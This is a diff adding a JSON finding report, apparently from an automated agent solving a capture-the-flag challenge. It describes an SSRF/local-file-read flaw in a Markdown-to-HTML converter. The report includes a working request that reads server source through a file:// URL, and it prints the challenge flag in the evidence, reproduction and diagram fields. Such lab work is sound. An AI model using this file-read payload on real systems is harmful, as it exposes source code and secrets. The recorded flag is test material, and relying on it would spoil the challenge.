@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:05:36.218143+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "14043eb2-733d-4210-bd1f-88214584e854",
+      "timestamp": "2026-04-12T22:05:36.218024+00:00",
+      "title": "CTF Flag - SSRF via file:// scheme bypasses admin restriction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55561/convert",
+      "description": "The Markdown-to-HTML converter at /convert accepts a URL parameter and uses Python's urllib.request.urlopen() to fetch the content. urllib supports the file:// scheme, enabling Local File Read / SSRF. The admin restriction at /admin and /admin/flag checks request.remote_addr == '127.0.0.1', but the file:// scheme bypasses the need to make an HTTP request entirely - it reads local files directly. The FLAG is hardcoded in app.py and was read using: url=file:///proc/self/cwd/app.py",
+      "evidence": "Source code of app.py read via file:///proc/self/cwd/app.py reveals:\n\nFLAG = \"flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}\"\n\n@app.route('/admin/flag')\ndef admin_flag():\n    if request.remote_addr != '127.0.0.1':\n        abort(403)  # Forbidden\n    return render_template('flag.html', flag=FLAG)\n\nFull file read via: POST /convert with body: url=file:///proc/self/cwd/app.py",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST http://172.17.0.1:55561/convert\nContent-Type: application/x-www-form-urlencoded\n\nurl=file:///proc/self/cwd/app.py",
+        "expected": "Returns app source code containing FLAG = \"flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}\""
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "78e06f27-3e57-4d0c-ba32-3927214e6788",
+      "timestamp": "2026-04-12T22:05:52.241967+00:00",
+      "title": "Markdown Converter App - Attack Surface",
+      "mermaid": "flowchart TD\n    Attacker[\"Attacker\"] --> Convert[\"POST /convert\\n(URL or markdown_text)\"]\n    Attacker --> Admin[\"GET /admin\\n403 Forbidden from external\"]\n    Attacker --> AdminFlag[\"GET /admin/flag\\n403 Forbidden from external\"]\n    Convert --> urllib[\"urllib.request.urlopen(url)\"]\n    urllib --> FileRead[\"file:///proc/self/cwd/app.py\\nLFI via file:// scheme\"]\n    urllib --> SSRF[\"http://127.0.0.1:55561/admin\\nBlocked by URL filter\"]\n    FileRead --> FLAG[\"FLAG extracted from app.py\\nflag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}\"]\n    Admin --> AdminCheck[\"request.remote_addr == 127.0.0.1?\"]\n    AdminFlag --> AdminCheck\n    AdminCheck --> |\"Yes - localhost\"| FlagTemplate[\"flag.html rendered\"]\n    AdminCheck --> |\"No - external\"| Forbidden[\"403 Forbidden\"]"
+    }
+  ]
+}
